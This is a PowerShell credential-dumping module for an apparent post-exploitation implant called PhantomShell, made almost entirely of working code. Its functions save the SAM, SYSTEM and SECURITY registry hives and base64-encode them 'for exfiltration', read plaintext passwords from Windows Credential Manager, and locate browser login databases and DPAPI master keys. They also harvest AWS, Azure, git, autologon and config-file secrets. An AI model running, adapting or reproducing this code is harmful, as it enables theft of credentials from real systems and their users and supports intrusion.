# PhantomShell v5.2 - Credential Dump Module
# Local credential extraction via .NET and Windows API

$ModuleCommands = @{
    "creddump"           = @{ Handler = { param($a) Invoke-CredDump @a }; Description = "Dump SAM hive credentials" }
    "vault-creds"        = @{ Handler = { param($a) Get-VaultCredentials @a }; Description = "Read Windows Credential Manager" }
    "dpapi-secrets"      = @{ Handler = { param($a) Get-DPAPISecrets @a }; Description = "Decrypt DPAPI blobs" }
    "cached-creds"       = @{ Handler = { param($a) Get-CachedCredentials @a }; Description = "Extract MSCache2 hashes" }
    "token-info"         = @{ Handler = { param($a) Get-TokenInfo @a }; Description = "Current token privileges and groups" }
    "find-stored-creds"  = @{ Handler = { param($a) Find-StoredCredentials @a }; Description = "Search for stored credentials in files/registry" }
}

# --- P/Invoke Definitions ---
$CredEnumSig = @"
using System;
using System.Runtime.InteropServices;

public class CredManager {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDENTIAL {
        public uint Flags;
        public uint Type;
        public string TargetName;
        public string Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public uint CredentialBlobSize;
        public IntPtr CredentialBlob;
        public uint Persist;
        public uint AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias;
        public string UserName;
    }

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CredEnumerate(string Filter, uint Flags, out int Count, out IntPtr Credentials);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern void CredFree(IntPtr Buffer);

    [DllImport("crypt32.dll", SetLastError = true)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn, IntPtr ppszDataDescr, ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags, ref DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }
}
"@

function Ensure-CredManagerType {
    try { [CredManager] | Out-Null } catch {
        Add-Type -TypeDefinition $CredEnumSig -ErrorAction Stop
    }
}

# --- SAM Dump via Registry ---
function Invoke-CredDump {
    param([hashtable]$Args = @{})
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            return @{ status = "error"; output = "Requires administrator privileges" }
        }

        $tempDir = [IO.Path]::Combine([IO.Path]::GetTempPath(), [guid]::NewGuid().ToString().Substring(0,8))
        [IO.Directory]::CreateDirectory($tempDir) | Out-Null

        $samPath = Join-Path $tempDir "sam.hiv"
        $sysPath = Join-Path $tempDir "system.hiv"
        $secPath = Join-Path $tempDir "security.hiv"

        # Save registry hives
        $null = & reg.exe save HKLM\SAM $samPath /y 2>&1
        $null = & reg.exe save HKLM\SYSTEM $sysPath /y 2>&1
        $null = & reg.exe save HKLM\SECURITY $secPath /y 2>&1

        $result = @{
            sam_path      = $samPath
            system_path   = $sysPath
            security_path = $secPath
        }

        # Read and encode hives for exfiltration
        if (Test-Path $samPath) {
            $result["sam_b64"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($samPath))
            $result["sam_size"] = (Get-Item $samPath).Length
        }
        if (Test-Path $sysPath) {
            $result["system_b64"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sysPath))
            $result["system_size"] = (Get-Item $sysPath).Length
        }
        if (Test-Path $secPath) {
            $result["security_b64"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($secPath))
            $result["security_size"] = (Get-Item $secPath).Length
        }

        # Cleanup temp files
        try {
            Remove-Item $samPath -Force -ErrorAction SilentlyContinue
            Remove-Item $sysPath -Force -ErrorAction SilentlyContinue
            Remove-Item $secPath -Force -ErrorAction SilentlyContinue
            Remove-Item $tempDir -Force -ErrorAction SilentlyContinue
        } catch {}

        return @{ status = "ok"; data = $result; output = "Hives saved and encoded. Parse offline with secretsdump.py" }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Windows Credential Manager ---
function Get-VaultCredentials {
    param([hashtable]$Args = @{})
    try {
        Ensure-CredManagerType

        $count = 0
        $pCreds = [IntPtr]::Zero
        $success = [CredManager]::CredEnumerate($null, 0, [ref]$count, [ref]$pCreds)

        if (-not $success -or $count -eq 0) {
            return @{ status = "ok"; data = @(); count = 0; output = "No credentials found or access denied" }
        }

        $creds = @()
        $ptrSize = [IntPtr]::Size

        for ($i = 0; $i -lt $count; $i++) {
            $credPtr = [Marshal]::ReadIntPtr($pCreds, $i * $ptrSize)
            $cred = [Marshal]::PtrToStructure($credPtr, [Type][CredManager+CREDENTIAL])

            $password = ""
            if ($cred.CredentialBlobSize -gt 0 -and $cred.CredentialBlob -ne [IntPtr]::Zero) {
                $password = [Marshal]::PtrToStringUni($cred.CredentialBlob, [int]($cred.CredentialBlobSize / 2))
            }

            $typeNames = @{1="Generic";2="Domain Password";3="Domain Certificate";4="Domain Visible Password"}
            $creds += @{
                target   = $cred.TargetName
                username = $cred.UserName
                password = $password
                type     = if ($typeNames.ContainsKey([int]$cred.Type)) { $typeNames[[int]$cred.Type] } else { "Unknown ($($cred.Type))" }
                comment  = $cred.Comment
            }
        }

        [CredManager]::CredFree($pCreds)

        return @{ status = "ok"; data = $creds; count = $creds.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- DPAPI Secrets ---
function Get-DPAPISecrets {
    param([hashtable]$Args = @{})
    try {
        Ensure-CredManagerType

        $results = @()
        $userProfile = [Environment]::GetFolderPath("UserProfile")

        # Chrome Local State / Login Data
        $chromeDataPaths = @(
            (Join-Path $userProfile "AppData\Local\Google\Chrome\User Data\Default\Login Data"),
            (Join-Path $userProfile "AppData\Local\Microsoft\Edge\User Data\Default\Login Data")
        )

        foreach ($dbPath in $chromeDataPaths) {
            if (-not (Test-Path $dbPath)) { continue }
            $browser = if ($dbPath -match "Chrome") { "Chrome" } else { "Edge" }
            $results += @{
                source = $browser
                path   = $dbPath
                note   = "Login Data DB found. Copy and parse with dpapi_decrypt tool for v80+ AES keys."
            }
        }

        # WiFi profiles (stored as DPAPI blobs)
        $wifiPath = "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"
        if (Test-Path $wifiPath) {
            $wifiProfiles = Get-ChildItem -Path $wifiPath -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue
            foreach ($profile in $wifiProfiles) {
                try {
                    $xml = [xml](Get-Content $profile.FullName)
                    $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
                    $auth = $xml.WLANProfile.MSM.security.authEncryption.authentication
                    $results += @{
                        source = "WiFi"
                        ssid   = $ssid
                        auth   = $auth
                        path   = $profile.FullName
                    }
                } catch {}
            }
        }

        # DPAPI master keys location
        $dpApiPath = Join-Path $userProfile "AppData\Roaming\Microsoft\Protect"
        if (Test-Path $dpApiPath) {
            $sidFolders = Get-ChildItem -Path $dpApiPath -Directory -ErrorAction SilentlyContinue
            foreach ($folder in $sidFolders) {
                $masterKeys = Get-ChildItem -Path $folder.FullName -File -ErrorAction SilentlyContinue
                $results += @{
                    source     = "DPAPI Master Keys"
                    sid        = $folder.Name
                    key_count  = $masterKeys.Count
                    path       = $folder.FullName
                }
            }
        }

        return @{ status = "ok"; data = $results; count = $results.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Cached Credentials (MSCache2) ---
function Get-CachedCredentials {
    param([hashtable]$Args = @{})
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            return @{ status = "error"; output = "Requires administrator privileges" }
        }

        # Export SECURITY hive
        $tempPath = Join-Path ([IO.Path]::GetTempPath()) "sec_$([guid]::NewGuid().ToString().Substring(0,8)).hiv"
        $null = & reg.exe save HKLM\SECURITY $tempPath /y 2>&1

        if (Test-Path $tempPath) {
            $secBytes = [IO.File]::ReadAllBytes($tempPath)
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue

            return @{
                status = "ok"
                data   = @{
                    security_hive_b64 = [Convert]::ToBase64String($secBytes)
                    size              = $secBytes.Length
                }
                output = "SECURITY hive exported. Parse with secretsdump.py or mimikatz for MSCache2/DCC2 hashes."
            }
        }

        return @{ status = "error"; output = "Failed to export SECURITY hive" }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Token Info ---
function Get-TokenInfo {
    param([hashtable]$Args = @{})
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)

        $groups = @()
        foreach ($group in $identity.Groups) {
            try {
                $translated = $group.Translate([Security.Principal.NTAccount])
                $groups += @{
                    sid  = $group.Value
                    name = $translated.Value
                }
            } catch {
                $groups += @{ sid = $group.Value; name = "(unresolvable)" }
            }
        }

        # Get privileges via whoami
        $privOutput = & whoami.exe /priv 2>&1 | Out-String
        $privileges = @()
        foreach ($line in ($privOutput -split "`n")) {
            if ($line -match "^(Se\w+)\s+.*?(Enabled|Disabled)") {
                $privileges += @{
                    name    = $Matches[1]
                    enabled = $Matches[2] -eq "Enabled"
                }
            }
        }

        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        $isSystem = $identity.IsSystem
        $impersonation = $identity.ImpersonationLevel.ToString()

        return @{
            status = "ok"
            data   = @{
                user            = $identity.Name
                sid             = $identity.User.Value
                auth_type       = $identity.AuthenticationType
                is_admin        = $isAdmin
                is_system       = $isSystem
                impersonation   = $impersonation
                token_type      = if ($identity.IsAuthenticated) { "Primary" } else { "Anonymous" }
                groups          = $groups
                group_count     = $groups.Count
                privileges      = $privileges
                privilege_count = $privileges.Count
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Find Stored Credentials ---
function Find-StoredCredentials {
    param([hashtable]$Args = @{})
    try {
        $findings = @()
        $userProfile = [Environment]::GetFolderPath("UserProfile")

        # Common credential file patterns
        $credPatterns = @(
            @{ Path = "C:\inetpub\wwwroot"; Pattern = "web.config"; Description = "IIS config files" },
            @{ Path = "C:\inetpub"; Pattern = "applicationHost.config"; Description = "IIS app host config" },
            @{ Path = $userProfile; Pattern = ".git-credentials"; Description = "Git stored credentials" },
            @{ Path = $userProfile; Pattern = ".pgpass"; Description = "PostgreSQL password file" },
            @{ Path = $userProfile; Pattern = ".my.cnf"; Description = "MySQL config" },
            @{ Path = $userProfile; Pattern = ".aws\credentials"; Description = "AWS credentials" },
            @{ Path = $userProfile; Pattern = ".azure\accessTokens.json"; Description = "Azure tokens" },
            @{ Path = "C:\"; Pattern = "unattend.xml"; Description = "Unattend install file" }
        )

        foreach ($cp in $credPatterns) {
            $searchPath = Join-Path $cp.Path $cp.Pattern
            if (Test-Path $searchPath) {
                $content = Get-Content $searchPath -Raw -ErrorAction SilentlyContinue
                $findings += @{
                    type        = "File"
                    description = $cp.Description
                    path        = $searchPath
                    size        = (Get-Item $searchPath).Length
                    preview     = if ($content.Length -gt 500) { $content.Substring(0, 500) + "..." } else { $content }
                }
            }
        }

        # Search for unattend.xml recursively in common locations
        $unattendPaths = @("C:\Windows\Panther", "C:\Windows\System32\Sysprep")
        foreach ($uPath in $unattendPaths) {
            if (Test-Path $uPath) {
                $found = Get-ChildItem -Path $uPath -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
                foreach ($f in $found) {
                    $content = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content -match "(?i)(password|credential|username)") {
                        $findings += @{
                            type        = "Unattend/Sysprep"
                            path        = $f.FullName
                            size        = $f.Length
                            preview     = if ($content.Length -gt 500) { $content.Substring(0, 500) + "..." } else { $content }
                        }
                    }
                }
            }
        }

        # Registry autologon
        try {
            $autoLogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
            if ($autoLogon.DefaultPassword) {
                $findings += @{
                    type        = "Registry"
                    description = "AutoLogon credentials"
                    username    = $autoLogon.DefaultUserName
                    domain      = $autoLogon.DefaultDomainName
                    password    = $autoLogon.DefaultPassword
                }
            }
        } catch {}

        # Scheduled tasks with stored credentials
        try {
            $tasks = & schtasks.exe /query /fo csv /v 2>&1 | ConvertFrom-Csv -ErrorAction SilentlyContinue
            $credTasks = $tasks | Where-Object { $_."Run As User" -and $_."Run As User" -ne "SYSTEM" -and $_."Run As User" -ne "LOCAL SERVICE" -and $_."Run As User" -ne "NETWORK SERVICE" }
            foreach ($task in $credTasks) {
                $findings += @{
                    type        = "ScheduledTask"
                    task_name   = $task.TaskName
                    run_as      = $_."Run As User"
                    command     = $_."Task To Run"
                }
            }
        } catch {}

        # Search for strings in common config files
        $searchDirs = @("C:\inetpub", "C:\xampp", "C:\wamp")
        $credRegex = "(?i)(password|passwd|pwd|secret|connectionstring|credential)\s*[=:]\s*[`"']?([^`"'\s;]{3,})"
        foreach ($dir in $searchDirs) {
            if (-not (Test-Path $dir)) { continue }
            $configFiles = Get-ChildItem -Path $dir -Include @("*.config","*.xml","*.ini","*.conf","*.json","*.php") -Recurse -ErrorAction SilentlyContinue | Select-Object -First 50
            foreach ($cf in $configFiles) {
                try {
                    $content = Get-Content $cf.FullName -Raw -ErrorAction SilentlyContinue
                    if ($content -match $credRegex) {
                        $findings += @{
                            type        = "ConfigFile"
                            path        = $cf.FullName
                            match       = $Matches[0]
                        }
                    }
                } catch {}
            }
        }

        return @{ status = "ok"; data = $findings; count = $findings.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}
